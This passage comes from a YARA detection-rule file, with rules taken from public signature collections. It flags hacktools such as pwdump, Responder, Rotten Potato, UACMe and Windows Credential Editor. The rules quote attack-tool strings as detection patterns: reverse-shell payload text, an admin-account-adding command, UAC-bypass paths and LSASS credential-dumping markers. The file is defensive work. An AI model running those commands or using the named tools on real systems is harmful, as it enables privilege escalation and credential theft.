\"PSAttack_EXE\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\Release\\\\PSAttack.pdb\" fullword\n        $s1 = \"set-executionpolicy bypass -Scope process -Force\" fullword wide\n        $s2 = \"PSAttack.Modules.\" ascii\n        $s3 = \"PSAttack.PSAttackProcessing\" fullword ascii\n        $s4 = \"PSAttack.Modules.key.txt\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and ($x1 or 2 of ($s*))) or 3 of them\n}\n\nrule Powershell_Attack_Scripts\n{\n    meta:\n        description = \"PowerShell attack scripts\"\n        classifications = \"Hacktool\"\n        threat_names = \"PS>Attack\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Powershell_Attack_Scripts\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"PowershellMafia\\\\Invoke-Shellcode.ps1\" ascii\n        $s2 = \"Nishang\\\\Do-Exfiltration.ps1\" ascii\n        $s3 = \"PowershellMafia\\\\Invoke-Mimikatz.ps1\" ascii\n        $s4 = \"Inveigh\\\\Inveigh.ps1\" ascii\n\n    condition:\n        1 of them\n}\n\nrule PSAttack_ZIP\n{\n    meta:\n        description = \"PS>Attack: PowerShell attack tool (file: PSAttack.zip)\"\n        ref = \"https://github.com/gdssecurity/PSAttack/releases/\"\n        classifications = \"Hacktool\"\n        threat_names = \"PS>Attack\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PSAttack_ZIP\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"PSAttack.exe\" fullword ascii\n\n    condition:\n        uint16(0) == 0x4b50 and all of them\n}\n\nrule PScan_Portscan_1\n{\n    meta:\n        description = \"PScan: port scanner\"\n        classifications = \"Hacktool\"\n        threat_names = \"PScan\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"F. Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PScan_Portscan_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"00050;0F0M0X0a0v0}0\"\n        $b = \"vwgvwgvP76\"\n        $c = \"Pr0PhOFyP\"\n\n    condition:\n        all of them\n}\n\nrule PwDump\n{\n    meta:\n        description = \"pwdump6: Windows NTLM and LanMan password grabber\"\n        classifications = \"Hacktool\"\n        threat_names = \"pwdump6\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Marc Stroebel\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PwDump\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s5 = \"Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineNa\"\n        $s6 = \"Unable to query service status. Something is wrong, please manually check the st\"\n        $s7 = \"pwdump6 Version %s by fizzgig and the mighty group at foofus.net\" fullword\n\n    condition:\n        1 of them\n}\n\nrule pyrasite\n{\n    meta:\n        description = \"pyrasite: a tool for injecting code into running Python processes\"\n        ref = \"https://github.com/lmacken/pyrasite\"\n        classifications = \"Hacktool\"\n        threat_names = \"pyrasite\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"hacktool_multi_pyrasite_py\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"WARNING: ptrace is disabled. Injection will not work.\" fullword ascii wide\n        $s2 = \"A payload that connects to a given host:port and receives commands\" fullword ascii wide\n        $s3 = \"A reverse Python connection payload.\" fullword ascii wide\n        $s4 = \"pyrasite - inject code into a running python process\" fullword ascii wide\n        $s5 = \"The ID of the process to inject code into\" fullword ascii wide\n        $s6 = \"This file is part of pyrasite.\" fullword ascii wide\n        $s7 = \"https://github.com/lmacken/pyrasite\" fullword ascii wide\n        $s8 = \"Setup a communication socket with the process by injecting\" fullword ascii wide\n        $s9 = \"a reverse subshell and having it connect back to us.\" fullword ascii wide\n        $s10 = \"Write out a reverse python connection payload with a custom port\" fullword ascii wide\n        $s11 = \"Wait for the injected payload to connect back to us\" fullword ascii wide\n        $s12 = \"PyrasiteIPC\" fullword ascii wide\n        $s13 = \"A reverse Python shell that behaves like Python interactive interpreter.\" fullword ascii wide\n        $s14 = \"pyrasite cannot establish reverse\" fullword ascii wide\n\n    condition:\n        any of them\n}\n\nrule QuarksPwDump_Gen\n{\n    meta:\n        description = \"Quarks PwDum: Windows credential dumper\"\n        ref = \"https://blog.quarkslab.com/quarks-pwdump.html\"\n        classifications = \"Hacktool\"\n        threat_names = \"Quarks PwDum\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"QuarksPwDump_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"OpenProcessToken() error: 0x%08X\" fullword ascii\n        $s2 = \"%d dumped\" fullword ascii\n        $s3 = \"AdjustTokenPrivileges() error: 0x%08X\" fullword ascii\n        $s4 = \"\\\\SAM-%u.dmp\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule RawDisk\n{\n    meta:\n        description = \"RawDisk: provides direct access to files, disks and partitions; used by wiper malware\"\n        threat_names = \"RawDisk\"\n        ref = \"https://sbb.eldos.com/rawdisk/, https://goo.gl/jKIfGB\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Shamoon_Disttrack_Dropper\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"\\\\#{9A6DB7D2-FECF-41ff-9A92-6EDA696613DF}#\" wide\n        $a2 = \"\\\\#{8A6DB7D2-FECF-41ff-9A92-6EDA696613DE}#\" wide\n        $s1 = \"\\\\amd64\\\\elrawdsk.pdb\" fullword ascii\n        $s2 = \"RawDiskSample.exe\" fullword wide\n        $s3 = \"RawDisk Driver. Allows write access to files and raw disk sectors for user mode applications in Windows 2000 and later.\" fullword wide\n        $s4 = \"elrawdsk.sys\" fullword wide\n        $s5 = \"\\\\DosDevices\\\\ElRawDisk\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 90KB and 1 of ($a*) and 1 of ($s*))\n}\n\nrule RedSails_EXE\n{\n    meta:\n        description = \"RedSails: Python-based post-exploitation tool\"\n        ref = \"https://github.com/BeetleChunks/redsails\"\n        classifications = \"Hacktool\"\n        threat_names = \"RedSails\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"redSails_EXE\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"bWinDivert64.dll\" fullword ascii\n        $s2 = \"bWinDivert32.dll\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 6000KB and all of them)\n}\n\nrule RedSails_PY\n{\n    meta:\n        description = \"RedSails: Python-based post-exploitation tool\"\n        ref = \"https://github.com/BeetleChunks/redsails\"\n        classifications = \"Hacktool\"\n        threat_names = \"RedSails\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"redSails_PY\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Gained command shell on host\" fullword ascii\n        $x2 = \"[!] Received an ERROR in shell()\" fullword ascii\n        $x3 = \"Target IP address with backdoor installed\" fullword ascii\n        $x4 = \"Open backdoor port on target machine\" fullword ascii\n        $x5 = \"Backdoor port to open on victim machine\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule Responder\n{\n    meta:\n        description = \"Responder: LLMNR, NBT-NS and MDNS poisoner\"\n        ref = \"https://github.com/SpiderLabs/Responder, http://www.c0d3xpl0it.com/2017/02/compromising-domain-admin-in-internal-pentest.html\"\n        classifications = \"Hacktool\"\n        threat_names = \"Responder\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"hacktool_multi_responder_py\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"Poison all requests with another IP address than Responder's one.\" fullword ascii wide\n        $s2 = \"Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.\" fullword ascii wide\n        $s3 = \"Enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network.\" fullword ascii wide\n        $s4 = \"This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.\" fullword ascii wide\n        $s5 = \"Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port)\" fullword ascii wide\n        $s6 = \"31mOSX detected, -i mandatory option is missing\" fullword ascii wide\n        $s7 = \"This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.\" fullword ascii wide\n\n    condition:\n        any of them\n}\n\nrule RottenPotato_Potato\n{\n    meta:\n        description = \"Rotten Potato: privilege escalation tool (file: Potato.exe)\"\n        ref = \"https://github.com/foxglovesec/RottenPotato\"\n        classifications = \"Hacktool\"\n        threat_names = \"Rotten Potato\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RottenPotato_Potato\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Potato.exe -ip <ip>\" fullword wide\n        $x2 = \"-enable_httpserver true -enable_spoof true\" fullword wide\n        $x3 = \"/C schtasks.exe /Create /TN omg /TR\" fullword wide\n        $x4 = \"-enable_token true -enable_dce true\" fullword wide\n        $x5 = \"DNS lookup succeeds - UDP Exhaustion failed!\" fullword wide\n        $x6 = \"DNS lookup fails - UDP Exhaustion worked!\" fullword wide\n        $x7 = \"\\\\obj\\\\Release\\\\Potato.pdb\" fullword ascii\n        $x8 = \"function FindProxyForURL(url,host){if (dnsDomainIs(host, \\\"localhost\\\")) return \\\"DIRECT\\\";\" fullword wide\n        $s1 = \"\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" /K start\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 1 of ($x*)) or (2 of them)\n}\n\nrule s4u\n{\n    meta:\n        description = \"s4u: Windows privilege escalation tool (file: s4u.exe)\"\n        ref = \"https://github.com/aurel26/s-4-u-for-windows\"\n        classifications = \"Hacktool\"\n        threat_names = \"s4u\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"s4u\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x0 = \"s4u.exe Domain\\\\Username [Extra SID]\" fullword ascii\n        $x1 = \"\\\\Release\\\\s4u.pdb\" ascii\n        $s0 = \"CreateProcessAsUser failed (error %u).\" fullword ascii\n        $s1 = \"GetTokenInformation failed (error: %u).\" fullword ascii\n        $s2 = \"LsaLogonUser failed (error 0x%x).\" fullword ascii\n        $s3 = \"LsaLogonUser: OK, LogonId: 0x%x-0x%x\" fullword ascii\n        $s4 = \"LookupPrivilegeValue failed (error: %u).\" fullword ascii\n        $s5 = \"The token does not have the specified privilege (%S).\" fullword ascii\n        $s6 = \"Unable to parse command line.\" fullword ascii\n        $s7 = \"Unable to find logon SID.\" fullword ascii\n        $s8 = \"AdjustTokenPrivileges failed (error: %u).\" fullword ascii\n        $s9 = \"AdjustTokenPrivileges (%S): OK\" fullword ascii\n        $g1 = \"%systemroot%\\\\system32\\\\cmd.exe\" wide\n        $g2 = \"SeTcbPrivilege\" wide\n        $g3 = \"winsta0\\\\default\" wide\n        $g4 = \".rsrc\"\n        $g5 = \"HeapAlloc\"\n        $g6 = \"GetCurrentProcess\"\n        $g7 = \"HeapFree\"\n        $g8 = \"GetProcessHeap\"\n        $g9 = \"ExpandEnvironmentStrings\"\n        $g10 = \"ConvertStringSidToSid\"\n        $g11 = \"LookupPrivilegeValue\"\n        $g12 = \"AllocateLocallyUniqueId\"\n        $g13 = \"ADVAPI32.dll\"\n        $g14 = \"LsaLookupAuthenticationPackage\"\n        $g15 = \"Secur32.dll\"\n        $g16 = \"MSVCR120.dll\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 60KB and (1 of ($x*) or all of ($s*) or all of ($g*))\n}\n\nrule SharpCat\n{\n    meta:\n        description = \"SharpCat: command shell (file: SharpCat.exe)\"\n        ref = \"https://github.com/Cn33liz/SharpCat\"\n        classifications = \"Hacktool\"\n        threat_names = \"SharpCat\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SharpCat\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"ShellZz\" fullword ascii\n        $s2 = \"C:\\\\Windows\\\\System32\\\\cmd.exe\" fullword wide\n        $s3 = \"currentDirectory\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 20KB and all of them\n}\n\nrule SQLMap\n{\n    meta:\n        description = \"SQLMap: SQL injection tool\"\n        classifications = \"Hacktool\"\n        threat_names = \"SQLMap\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SQLMap\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"except SqlmapBaseException, ex:\"\n\n    condition:\n        1 of them\n}\n\nrule TempRacer\n{\n    meta:\n        description = \"TempRacer: Windows privilege escalation tool (file: TempRacer.exe)\"\n        ref = \"https://github.com/realalexandergeorgiev/tempracer, http://www.darknet.org.uk/2016/03/tempracer-windows-privilege-escalation-tool/\"\n        classifications = \"Hacktool\"\n        threat_names = \"TempRacer\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TempRacer\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\obj\\\\Release\\\\TempRacer.pdb\" ascii\n        $s2 = \"[+] Injecting into \" fullword wide\n        $s3 = \"net localgroup administrators alex /add\" fullword wide\n        $s4 = \"[+] File: {0} renamed to {1}\" fullword wide\n        $s5 = \"[+] Blocking \" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 25KB and 1 of them) or (4 of them)\n}\n\nrule UACElevator\n{\n    meta:\n        description = \"UACElevator: Windows UAC bypass tool (file: UACElevator.exe)\"\n        ref = \"https://github.com/MalwareTech/UACElevator\"\n        classifications = \"Hacktool\"\n        threat_names = \"UACElevator\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"UACElevator\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\UACElevator.pdb\" ascii\n        $s1 = \"%userprofile%\\\\Downloads\\\\dwmapi.dll\" fullword ascii\n        $s2 = \"%windir%\\\\system32\\\\dwmapi.dll\" fullword ascii\n        $s3 = \"Infection module: %s\" fullword ascii\n        $s4 = \"Could not save module to %s\" fullword ascii\n        $s5 = \"%s%s%p%s%ld%s%d%s\" fullword ascii\n        $s6 = \"Stack area around _alloca memory reserved by this function is corrupted\" fullword ascii\n        $s7 = \"Stack around the variable '\" fullword ascii\n        $s8 = \"MSVCR120D.dll\" fullword wide\n        $s9 = \"Address: 0x\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 172KB and ($x1 or 8 of ($s*))\n}\n\nrule UACMe_Akagi\n{\n    meta:\n        description = \"UACMe: UAC elevation tool\"\n        ref = \"https://github.com/hfiref0x/UACME\"\n        classifications = \"Hacktool\"\n        threat_names = \"UACMe\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"UACME_Akagi\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"UACMe injected, Fubuki at your service.\" wide fullword\n        $x3 = \"%temp%\\\\Hibiki.dll\" fullword wide\n        $x4 = \"[UCM] Cannot write to the target process memory.\" fullword wide\n        $s1 = \"%systemroot%\\\\system32\\\\cmd.exe\" wide\n        $s2 = \"D:(A;;GA;;;WD)\" wide\n        $s3 = \"%systemroot%\\\\system32\\\\sysprep\\\\sysprep.exe\" fullword wide\n        $s4 = \"/c wusa %ws /extract:%%windir%%\\\\system32\" fullword wide\n        $s5 = \"Fubuki.dll\" ascii fullword\n        $l1 = \"ntdll.dll\" ascii\n        $l2 = \"Cabinet.dll\" ascii\n        $l3 = \"GetProcessHeap\" ascii\n        $l4 = \"WriteProcessMemory\" ascii\n        $l5 = \"ShellExecuteEx\" ascii\n\n    condition:\n        (1 of ($x*)) or (3 of ($s*) and all of ($l*))\n}\n\nrule UACME_Akagi_2\n{\n    meta:\n        description = \"UACMe: Windows UAC bypass tool (files: Akagi32.exe, Akagi64.exe)\"\n        ref = \"https://github.com/hfiref0x/UACME\"\n        classifications = \"Hacktool\"\n        threat_names = \"UACMe\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"UACME_Akagi_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Usage: Akagi.exe [Method] [OptionalParamToExecute]\" fullword wide\n        $x2 = \"[UCM] Target file already exists, abort\" fullword wide\n        $s1 = \"MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\" fullword wide\n        $s2 = \"Akagi.exe\" fullword wide\n        $s3 = \"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}\" fullword wide\n        $s4 = \"/c wusa %ws /extract:%%windir%%\\\\system32\\\\sysprep\" fullword wide\n        $s5 = \"/c wusa %ws /extract:%%windir%%\\\\system32\\\\migwiz\" fullword wide\n        $s6 = \"loadFrom=\\\"%systemroot%\\\\system32\\\\sysprep\\\\cryptbase.DLL\\\"\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 900KB and (1 of ($x*) or 3 of ($s*))) or (6 of them)\n}\n\nrule Win7Elevatev2\n{\n    meta:\n        description = \"Win7Elevate: Windows UAC bypass utility\"\n        ref = \"http://www.pretentiousname.com/misc/W7E_Source/Win7Elevate_Inject.cpp.html\"\n        classifications = \"Hacktool\"\n        threat_names = \"Win7Elevate\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Win7Elevatev2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"This program attempts to bypass Windows 7's default UAC settings to run \" wide\n        $x2 = \"Win7ElevateV2\\\\x64\\\\Release\\\\\" ascii\n        $x3 = \"Run the command normally (without code injection)\" wide\n        $x4 = \"Inject file copy && elevate command\" fullword wide\n        $x5 = \"http://www.pretentiousname.com/misc/win7_uac_whitelist2.html\" fullword wide\n        $x6 = \"For injection, pick any unelevated Windows process with ASLR on:\" fullword wide\n        $s1 = \"\\\\cmd.exe\" wide\n        $s2 = \"runas\" wide\n        $s3 = \"explorer.exe\" wide\n        $s4 = \"Couldn't load kernel32.dll\" wide\n        $s5 = \"CRYPTBASE.dll\" wide\n        $s6 = \"shell32.dll\" wide\n        $s7 = \"ShellExecuteEx\" ascii\n        $s8 = \"COMCTL32.dll\" ascii\n        $s9 = \"ShellExecuteEx\" ascii\n        $s10 = \"HeapAlloc\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (1 of ($x*) or all of ($s*))\n}\n\nrule WindowsCredentialEditor\n{\n    meta:\n        description = \"Windows Credential Editor\"\n        classifications = \"Hacktool\"\n        threat_names = \"Windows Credential Editor\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WindowsCredentialEditor\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"extract the TGT session key\"\n        $b = \"Windows Credentials Editor\"\n\n    condition:\n        all of them\n}\n\nrule WCE_Modified_1_1014\n{\n    meta:\n        description = \"Windows Credential Editor\"\n        classifications = \"Hacktool\"\n        threat_names = \"Windows Credential Editor\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WCE_Modified_1_1014\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"LSASS.EXE\" fullword ascii\n        $s1 = \"_CREDS\" ascii\n        $s9 = \"Using WCE \" ascii\n\n    condition:\n        all of them\n}\n\nrule WCE_in_memory\n{\n    meta:\n        description = \"Windows Credential Editor\"\n        classifications = \"Hacktool\"\n        threat_names = \"Windows Credential Editor\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WCE_in_memory\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"wkKUSvflehHr::o:t:s:c:i:d:a:g:\" fullword ascii\n        $s2 = \"wceaux.dll\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule WPR_loader_EXE\n{\n    meta:\n        description = \"Windows Password Recovery (file: loader.exe)\"\n        classifications = \"Hacktool\"\n        threat_names = \"Windows Password Recovery\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WPR_loader_EXE\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Failed to get system process ID\" fullword wide\n        $s2 = \"gLSASS.EXE\" fullword wide\n        $s3 = \"WriteProcessMemory failed\" fullword wide\n        $s4 = \"wow64 process NOT created\" fullword wide\n        $s5 = \"\\\\ast.exe\" fullword wide\n        $s6 = \"Exit code=%s, status=%d\" fullword wide\n        $s7 = \"VirtualProtect failed\" fullword wide\n        $s8 = \"nSeDebugPrivilege\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and 3 of them)\n}\n\nrule WPR_loader_DLL\n{\n    meta:\n        description = \"Windows Password Recovery (file: loader64.dll)\"\n        classifications = \"Hacktool\"\n        threat_names = \"Windows Password Recovery\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WPR_loader_DLL\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"loader64.dll\" fullword ascii\n        $x2 = \"loader.dll\" fullword ascii\n        $s1 = \"TUlDUk9TT0ZUX0FVVEhFTlRJQ0FUSU9OX1BBQ0tBR0VfVjFfMA==\" fullword ascii\n        $s2 = \"UmVtb3RlRGVza3RvcEhlbHBBc3Npc3RhbnRBY2NvdW50\" fullword ascii\n        $s3 = \"U2FtSVJldHJpZXZlUHJpbWFyeUNyZWRlbnRpYWxz\" fullword ascii\n        $s4 = \"VFM6SW50ZXJuZXRDb25uZWN0b3JQc3dk\" fullword ascii\n        $s5 = \"TCRVRUFjdG9yQWx0Q3JlZFByaXZhdGVLZXk=\" fullword ascii\n        $s6 = \"YXNwbmV0X1dQX1BBU1NXT1JE\" fullword ascii\n        $s7 = \"TCRBTk1fQ1JFREVOVElBTFM=\" fullword ascii\n        $s8 = \"RGVmYXVsdFBhc3N3b3Jk\" fullword ascii\n        $op0 = { 48 8b cd e8 e0 e8 ff ff 48 89 07 48 85 c0 74 72 }\n        $op1 = { e8 ba 23 00 00 33 c9 ff 15 3e 82 }\n        $op2 = { 48 83 c4 28 e9 bc 55 ff ff 48 8d 0d 4d a7 00 00 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and ((1 of ($x*) and 1 of ($s*)) or (1 of ($s*) and all of ($op*)))\n}\n\nrule WPR_Passscape_Loader\n{\n    meta:\n        description = \"Windows Password Recovery (file: ast.exe)\"\n        classifications = \"Hacktool\"\n        threat_names = \"Windows Password Recovery\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WPR_Passscape_Loader\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\PasscapeLoader64\" fullword wide\n        $s2 = \"ast64.dll\" fullword ascii\n        $s3 = \"\\\\loader64.exe\" fullword wide\n        $s4 = \"Passcape 64-bit Loader Service\" fullword wide\n        $s5 = \"PasscapeLoader64\" fullword wide\n        $s6 = \"ast64 {msg1GkjN7Sh8sg2Al7ker63f}\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 2 of them)\n}\n\nrule WPR_Asterisk_Hook_Library\n{\n    meta:\n        description = \"Windows Password Recovery (file: ast64.dll)\"\n        classifications = \"Hacktool\"\n        threat_names = \"Windows Password Recovery\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WPR_Asterisk_Hook_Library\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ast64.dll\" fullword ascii\n        $s2 = \"ast.dll\" fullword wide\n        $s3 = \"c:\\\\%s.lvc\" fullword ascii\n        $s4 = \"c:\\\\%d.lvc\" fullword ascii\n        $s5 = \"Asterisk Hook Library\" fullword wide\n        $s6 = \"?Ast_StartRd64@@YAXXZ\" fullword ascii\n        $s7 = \"Global\\\\{1374821A-281B-9AF4-%04X-12345678901234}\" fullword ascii\n        $s8 = \"2004-2013 Passcape Software\" fullword wide\n        $s9 = \"Global\\\\Passcape#6712%04X\" fullword ascii\n\n    condition:\n        